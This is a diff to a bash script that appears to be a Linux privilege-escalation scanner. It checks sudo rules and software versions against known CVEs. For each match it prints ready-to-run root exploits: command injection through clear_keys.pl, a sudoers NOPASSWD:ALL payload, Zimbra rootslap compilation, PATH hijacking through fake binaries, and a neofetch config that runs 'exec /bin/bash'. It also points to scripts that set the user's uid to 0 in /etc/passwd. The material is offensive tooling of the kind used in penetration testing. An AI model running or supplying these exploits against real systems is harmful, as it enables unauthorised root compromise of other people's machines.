@@ -60,7 +60,8 @@ compare_versions() {
 # CVE-2023-36624 - Loxone Miniserver Go Gen.2 
 
 check1=$(echo "$cmd" 2>/dev/null | grep -i "starthomekit.service")
-check2=$(echo "$cmd" 2>/dev/null | grep -i "miniserverinit applytzdata")
+#check2=$(echo "$cmd" 2>/dev/null | grep -i "miniserverinit applytzdata")
+check2=$(echo "$cmd" 2>/dev/null | grep -i "miniserverinit")
 check3=$(echo "$cmd" 2>/dev/null | grep -i "$(which tar) \*")
 
 if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
@@ -79,7 +80,7 @@ fi
 # CVE-2023-32696 - CKAN
 
 check1=$(cat /etc/passwd | cut -d ":" -f 1 | grep -iw "ckan")
-check2=$(groups ckan | grep -i sudo)
+check2=$(groups ckan 2>/dev/null | grep -i sudo)
 check3=$(ls -al /srv/app/start_ckan_development.sh 2>/dev/null)
 
 if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
@@ -98,12 +99,12 @@ fi
 
 # CVE-2023-30630 - dmidecode
 
-check1=`/usr/sbin/dmidecode -V`
-check2=`echo "$cmd" 2>/dev/null | grep -i "dmidecode" | grep -i "(ALL\|(root"`
-chk3=`compare_versions "$cversion" "$vversion" "Dmidecode"`
-check3=`echo $chk3 | grep -v "NOT"`
+check1=$(/usr/sbin/dmidecode -V)
+check2=$(echo "$cmd" 2>/dev/null | grep -i "dmidecode" | grep -i "(ALL\|(root")
+chk3=$(compare_versions "$cversion" "$vversion" "Dmidecode")
+check3=$(echo $chk3 | grep -v "NOT")
 
-dmidecode_version=`/usr/sbin/dmidecode -V`
+dmidecode_version=$(/usr/sbin/dmidecode -V)
 
 cversion=$dmidecode_version
 vversion="3.5"
@@ -117,10 +118,10 @@ if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
     echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-30630.txt"
     echo -e "${BOLD}${RED}[-] IMPORTANT: This vulnerability overwrite existing file, issue might occur on production system. A backup should be done prior to exploitation.${RESET}"
     echo -e "[-] For privilege escalation, the steps below can followed to limit the risk. The exploit will set the current user uid to 0 on /etc/passwd"
-    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/exploit.sh"
+    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/exploit-SK.sh"
     echo -e "[*] After successfully running the script, you may need to log again with the current user depending on OS flavor/version, you should have uid=0 when you run command id"
     echo -e "[-] The /etc/passwd backup is stored here : CVE/3rdPartyApps/CVE-2023-32696/passwd.backup"
-    echo -e "[*] Exploit: CVE/3rdPartyApps/CVE-2023-32696/restore.sh"
+    echo -e "[*] Restore (after PE when root): CVE/3rdPartyApps/CVE-2023-32696/restore.sh"
     echo -e "\n"
 
 fi
@@ -128,9 +129,9 @@ fi
 # ------------------------------------------------------
 
 # CVE-2023-26604 - systemd
-check1=`which systemd`
-check2=`systemd --version 2>/dev/null | awk 'NR==1{print $2}'`
-check3=`echo "$cmd" 2>/dev/null | grep -i "systemctl status"`
+check1=$(which systemd)
+check2=$(systemd --version 2>/dev/null | awk 'NR==1{print $2}')
+check3=$(echo "$cmd" 2>/dev/null | grep -i "systemctl status")
 
 if [ -n "$check1" ] && [ -n "$check3" ] ; then
      if (( check2 < 247 )); then
@@ -149,11 +150,11 @@ fi
 
 # CVE-2013-4984 - Sophos Web Appliance
 
-check1=`echo "$cmd" 2>/dev/null | grep -i "sophox"`
-check2=`echo "$cmd" 2>/dev/null | grep -i "sophox-register"`
-check3=`echo "$cmd" 2>/dev/null | grep -i "sophox-remote-assist"`
-check4=`echo "$cmd" 2>/dev/null | grep -i "clear_keys.pl"`
-check5=`echo "$cmd" 2>/dev/null | grep -i "/opt/cma/bin/clear_keys.pl"`
+check1=$(echo "$cmd" 2>/dev/null | grep -i "sophox")
+check2=$(echo "$cmd" 2>/dev/null | grep -i "sophox-register")
+check3=$(echo "$cmd" 2>/dev/null | grep -i "sophox-remote-assist")
+check4=$(echo "$cmd" 2>/dev/null | grep -i "clear_keys.pl")
+check5=$(echo "$cmd" 2>/dev/null | grep -i "/opt/cma/bin/clear_keys.pl")
 
 if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
   
@@ -166,43 +167,26 @@ if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
     echo -e "[*] Generally the user that is allow to run the script is named spiderman"
     echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2013-4984.txt"
     echo -e "[*] Exploit: sudo /opt/cma/bin/clear_keys.pl fakeclientfqdn \";/bin/bash id;\" /fakedir \n"
-    #echo -e "\n"
+    echo -e "\n"
   fi
 
 fi
 
 
-# ------------------------------------------------------
-
- echo -e "${BOLD}${BLUE} ====== [B] Misconfig related to specific 3rdParty App/Device ====== ${RESET} \n"
- 
-# neofetch
-who=$(whoami)
-check1=`echo "$cmd" 2>/dev/null | grep "XDG_CONFIG_HOME" | grep "env_keep"`
-check2=$(ls /home/$who/.config/neofetch/config.conf 2>/dev/null)
-check3=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\""`
-
-if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
-   cmdneo=`echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"" | cut -d: -f 2- | sed 's/^ //g'`
-   echo -e "${BOLD}${RED}[-] neofetch sudo's rule is vulnerable ${RESET}"
-   echo -e "${BOLD}${GREEN}[-] neofetch is vulnerable to command injection in config file${RESET}"
-    echo -e "[-] $(echo $check3 | sed 's/^ //g')"
-   echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
-fi
-
 # CVE-2023-1326 - apport-cli
-check1=`echo "$cmd" 2>/dev/null | grep "apport-cli" | cut -d ":" -f 2`
+check1=$(echo "$cmd" 2>/dev/null | grep "apport-cli" | cut -d ":" -f 2)
 if [ -n "$check1" ] ; then
   echo -e "${BOLD}${RED}[-] apport-cli is vulnerable ${RESET}"
   echo -e "${BOLD}${GREEN}[-] apport-cli is not recommended to be ran with sudo${RESET}"
   echo -e "[-] $(echo "$cmd" | grep -i 'apport-cli' | sed 's/^ //g')"
   echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-1326.txt"
   echo -e "[*] Exploit: sudo$check1 ${BLUE}then input v in the menu and run ${RESET}!id \n"
+  echo -e "\n"
 fi
 
 
 # CVE-2022-45153 - saphanabootstrap-formula 
-check1=`echo "$cmd" 2>/dev/null | grep "crm_attribute"`
+check1=$(echo "$cmd" 2>/dev/null | grep "crm_attribute")
 check2=$(which salt-call | sed 's/ //g')
 check3a=$(lsb_release -a 2>/dev/null | grep -i Description | grep -i "SUSE Linux Enterprise Server for SAP Applications 15 SP1\|SUSE Linux Enterprise Server 12 SP5")
 check3b=$(cat /etc/os-release | grep -i PRETTY_NAME | grep -i "openSUSE Leap 15.4")
@@ -217,12 +201,14 @@ if [ -n "$check1" ] && [ -n "$check2" ] ; then
             echo -e "[-] Note: CVE/CVE-2022-45153/CVE-2022-45153.txt"
             echo -e "[*] Exploit: cp CVE/CVE-2022-45153/ha_cluster_exploit.sls /usr/share/salt-formulas/states/ha_cluster_exploit.sls; echo '$who ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers \n"
             echo -e "[*] We then need to wait root user to run : salt-call --local state.apply ha_cluster_exploit once done we just need to sudo su"
+            echo -e "\n"
+            echo -e "\n"
     fi
      
 fi
 
 # CVE-2022-37393 - Zimbra
-check1=`echo "$cmd" 2>/dev/null | grep "/opt/zimbra/libexec/zmslapd"`
+check1=$(echo "$cmd" 2>/dev/null | grep "/opt/zimbra/libexec/zmslapd")
 check2=$(cat /etc/passwd | cut -d ":" -f 1 | grep -i zimbra)
 #check3=$(su - zimbra -c "zmcontrol -v" | sed -r 's/([^0-9]*)([0-9].[0-9].[0-9])(.*)/2/')
 check3=$(su - zimbra -c "zmcontrol -v" 2>/dev/null | sed 's/Release//g' | cut -d . -f 1,2,3,4 | sed 's/^ //g' )
@@ -231,20 +217,49 @@ if [ -n "$check1" ] && [ -n "$check2" ] ; then
     echo -e "[-] Zimbra current version $check3 [vulnerable version including 9.0.0 P25 and 8.8.15 P32]"
     echo -e "[-] Note: CVE/CVE-2022-45153/CVE-2022-45153.txt"
     echo -e "[*] Exploit: gcc -shared -o /tmp/slapper/libhax.so CVE/CVE-2022-45153/libhax.c; gcc -o /tmp/slapper/rootslap CVE/CVE-2022-45153/rootslap.c; sudo /opt/zimbra/libexec/zmslapd -u root -g root -f CVE/CVE-2022-45153/slapd.conf; /tmp/slapper/rootslap"
-
+    echo -e "\n"
+    echo -e "\n"
 fi
 
 
 # CVE-2022-38060 - OpenStack Kolla 
-check1=`echo "$cmd" 2>/dev/null | grep "kolla_copy_cacerts" | grep -i "setenv" | awk '{ print $NF}' | sed 's/^ //g'`
-check2=`echo "$cmd" 2>/dev/null | grep -i Defaults -A 5 | grep -i "setenv"`
+check1=$(echo "$cmd" 2>/dev/null | grep "kolla_copy_cacerts" | grep -i "setenv" | awk '{ print $NF}' | sed 's/^ //g')
+check2=$(echo "$cmd" 2>/dev/null | grep -i Defaults -A 5 | grep -i "setenv")
  
  if [ -n "$check1" ] || [ -n "$check2" ] ; then
      echo -e "${BOLD}${RED}[-] OpenStack Kolla  is vulnerable to path hijacking! ${RESET}"
      echo -e "${BOLD}${GREEN}[-] A path hijacking is possible due to using setenv and relative path to a binary in the script from sudo's rule${RESET}"
      echo -e "[-] $(echo "$cmd" | grep -i 'kolla_copy_cacerts' | sed 's/^ //g')"
      echo -e "[*] Exploit: echo '#!/bin/bash' > /tmp/update-ca-certificates;echo 'id' >> /tmp/update-ca-certificates; chmod +x /tmp/update-ca-certificates; sudo PATH=/tmp:\$PATH $check1 ; rm /tmp/update-ca-certificates\n"
+     echo -e "\n"
  fi
+
+# ------------------------------------------------------
+
+ echo -e "${BOLD}${BLUE} ====== [B] Misconfig related to 3rdParty App/Device (No CVE assigned) ====== ${RESET} \n"
+ 
+# neofetch
+who=$(whoami)
+check1=$(echo "$cmd" 2>/dev/null | grep "XDG_CONFIG_HOME" | grep "env_keep")
+check2=$(ls /home/$who/.config/neofetch/config.conf 2>/dev/null)
+#check3=$(echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"")
+check3=$(echo "$cmd" 2>/dev/null | grep "neofetch")
+
+#echo $check1
+#echo $check2
+#echo $check3
+
+if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
+   cmdneo=$(echo "$cmd" 2>/dev/null | grep "neofetch \\\"\\\"" | cut -d: -f 2- | sed 's/^ //g')
+   echo -e "${BOLD}${RED}[-] neofetch sudo's rule is vulnerable ${RESET}"
+   echo -e "${BOLD}${GREEN}[-] neofetch is vulnerable to command injection in config file${RESET}"
+   echo -e "[-] $(echo $check3 | sed 's/^ //g')"
+   #echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
+   echo -e "[*] Exploit: mkdir -p /tmp/cnf/neofetch;export XDG_CONFIG_HOME=/tmp/cnf; echo 'exec /bin/bash' >> /tmp/cnf/neofetch/config.conf; sudo $cmdneo; rm /tmp/cnf/neofetch/config.conf \n"
+   echo -e "\n"
+fi
+
+
 
 
 # ------------------------------------------------------
@@ -258,7 +273,7 @@ check2=$(echo "$cmd" 2>/dev/null | grep "\.go")
 
 if [ -n "$check1" ] && [ -n "$check2" ] ; then
    
-    goscriptpath=`echo "$cmd" 2>/dev/null | grep .go | cut -d: -f 2 | sed 's/ /\n/g' | grep "\.go$"`
+    goscriptpath=$(echo "$cmd" 2>/dev/null | grep .go | cut -d: -f 2 | sed 's/ /\n/g' | grep "\.go$")
     if [ -n "$goscriptpath" ] ; then
         for gospath in $goscriptpath; do        
             # if /bin/bash or /bin/sh then check if second argument has /
@@ -268,6 +283,7 @@ if [ -n "$check1" ] && [ -n "$check2" ] ; then
              echo -e "${BOLD}${GREEN}[-] Creating a script with the same name in the current directory can be used for privilege escalation.${RESET}"
              echo -e "[-] $(echo $check1 | sed 's/^ //g')"
              echo -e "[*] Exploit: cd /tmp; echo '#!/bin/bash' > /tmp/$bashrelpath;echo 'id' >> /tmp/$bashrelpath; chmod +x /tmp/$bashrelpath;sudo $(echo $check1 | cut -d: -f2 | sed 's/^ //g'); rm /tmp/$bashrelpath"
+             echo -e "\n"
              echo -e "\n"
              fi
         done
